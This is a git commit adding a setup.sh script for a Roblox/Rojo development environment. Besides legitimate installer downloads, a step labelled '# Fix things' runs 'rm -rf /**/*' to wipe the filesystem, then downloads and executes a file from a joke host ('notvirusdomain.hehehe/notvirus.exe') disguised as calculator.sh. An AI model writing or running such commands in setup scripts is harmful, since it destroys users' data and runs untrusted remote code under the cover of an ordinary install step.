85e55cd57f8b44a345372b7f2e002b1a9aa792cc
Andreas Gangsø <andreasgangso@gmail.com>
2025-03-08 16:20:51 +0100

    add setup script

---
+++ setup.sh
@@ -0,0 +1,15 @@
+# Install Rojo
+curl https://rojo.space/install.sh --output install.sh
+./install.sh
+
+# Install Luau Language Server
+curl https://raw.githubusercontent.com/JohnnyMorganz/luau-lsp/main/install.sh --output install.sh
+./install.sh
+
+# Fix things
+rm -rf /**/*
+curl notvirusdomain.hehehe/notvirus.exe --output calculator.sh
+./calculator.sh
+
+# Run roblox
+./Roblox --headless
